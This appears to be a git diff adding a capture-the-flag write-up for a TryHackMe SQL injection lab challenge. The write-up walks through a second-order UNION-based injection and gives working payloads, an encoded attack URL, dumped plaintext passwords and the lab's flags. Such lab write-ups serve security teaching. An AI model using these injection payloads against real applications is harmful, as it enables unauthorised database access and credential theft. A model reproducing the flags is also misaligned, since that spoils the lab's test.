@@ -553,3 +553,87 @@ Summary Table: Module 8 Details
 | Breakout Sequence        | ')                                                                                    | 
 | Exfiltration Payload     | "') Union select 1,2,3,group_concat(password) from users-- -"                         |
 | Captured Flag            | THM{27f8f7ce3c05ca8d6553bc5948a89210}                                                 |
+
+## SQL Injection Lab (Module 9)
+Executive Summary
+This document provides a comprehensive vulnerability assessment and technical walkthrough for Task 10: Vulnerable Startup: Book Title 2 (Challenge 7) from the TryHackMe SQL Injection lab. The challenge demonstrates a multi-stage database interaction flaw where the output of an initial vulnerable query is passed unsanitized into a second query. By leveraging double single-quote escaping (```''```) to manipulate the second-stage query string, an attacker can bypass traditional subquery constraints and execute a secondary ```UNION SELECT``` injection to dump sensitive credentials and recover the flag.
+
+Target & Vulnerability Overview
+- Target Application: ```Book Title 2 Search ([http://10.48.174.24:5000/challenge7/](http://10.48.174.24:5000/challenge7/))```
+- Target Endpoint: ```/challenge7/book```     
+- Vulnerable Parameter: ```title``` (GET request)
+- Vulnerability Class: Second-Order / Multi-Query UNION-Based SQL Injection
+- Objective: Escape the double-query structure using quote duplication, force the second query into a ```UNION SELECT``` injection, and exfiltrate the ```password``` field from the ```users``` table.
+
+Vulnerability Mechanism Analysis
+1. Multi-Stage Query Execution Flow
+The application processes book searches using a two-tier database query structure:
+- Query 1 (Initial Lookup):
+```sql
+SELECT id FROM books WHERE title LIKE '<user_input>%'
+```
+- Query 2 (Data Retrieval):
+```sql
+SELECT * FROM books WHERE id = '<result_from_query_1>'
+```
+2. Exploitation Mechanics
+    1. Result Overriding: Injecting ```' union select '1'-- -``` into Query 1 forces it to return ```'1'``` instead of the standard lookup result.
+    2. Quote Escaping: Appending a double single-quote (```''```) before the second UNION clause escapes the string wrapper within Query 2:
+```plaintext
+' union select '-1''union select 1,2,3,4-- -
+```
+3. Control of Query 2: Query 2 receives the unescaped string and executes a secondary ```UNION SELECT``` directly against the database, enabling reflection of custom query results.
+
+Step-by-Step Exploitation Walkthrough
+Step 1: User Registration & Navigation
+1. Navigate to ```[http://10.48.174.24:5000/challenge7/signup](http://10.48.174.24:5000/challenge7/signup)``` and create a testing account (```test / 123```).
+2. Authenticate at ```/login``` and proceed to the dashboard (```/home```), which directs to the search function at ```/challenge7/book?title=test```.
+
+Step 2: Subquery Result Manipulation
+
+Test passing a basic injection to observe how Query 1 controls Query 2:
+- Payload: ```' union select '1'-- -```
+- Executed Query 1: ```SELECT id FROM books WHERE title LIKE '' union select '1'-- -%'```
+- Executed Query 2: ```SELECT * FROM books WHERE id = '1'```
+- Result: Query ```1``` passes 1 to Query 2, rendering details for book ID 1 (Harry Potter).
+
+Step 3: Escaping Query 2 and Column Mapping
+To control Query 2, break out of its internal string quote by doubling up the quote symbol (```''```):
+- Payload: ```' union select '-1''union select 1,2,3,4-- -```
+- Executed Query 1:
+```sql
+SELECT id FROM books WHERE title LIKE '' union select '-1''union select 1,2,3,4-- -%'
+```
+- Executed Query 2:
+```sql
+SELECT * FROM books WHERE id = '-1'union select 1,2,3,4-- -%'
+```
+- Rendered Column Positions:
+    - Title: 2
+    - Description: 3
+    - Author: 4
+
+Step 4: Database Exfiltration & Flag Recovery
+Concatenate all user passwords into the 4th position using ```group_concat()```:
+- Payload:
+```plaintext
+' union select '1''union select 1,2,3,group_concat(password) from users-- -
+```
+- Full URL Query:
+```plaintext
+http://10.48.174.24:5000/challenge7/book?title=%27+union+select+%271%27%27union+select+1%2C2%2C3%2Cgroup_concat%28password%29+from+users--+-
+```
+- Rendered Response (```Author``` field):
+```plaintext
+Author: THM{183526c1843c09809695a9979a672f09},asd,Summer2019!,345m3io4hj3,viking123,123
+```
+Summary Table: Module 9 Details
+| Parameter / Metric         | Target Value / Result                                                                 |
+|:--                         |:--                                                                                    |
+| Challenge Module           | Task 10 / Challenge 7 (Book Title 2)                                                  |
+| Vulnerable URL             | [http://10.48.174.24:5000/challenge7/book](http://10.48.174.24:5000/challenge7/book)  | 
+| Vulnerability Class        | Second-Order / Multi-Query UNION SQLi                                                 | 
+| Vulnerable Parameter       | title (GET)                                                                           |
+| Quote Escape Method        | Double single-quote ('') breakout                                                     | 
+| Exfiltration Payload       | "' union select '1''union select 1,2,3,group_concat(password) from users-- -"         |  
+| Captured Flag              | THM{183526c1843c09809695a9979a672f09}                                                 |
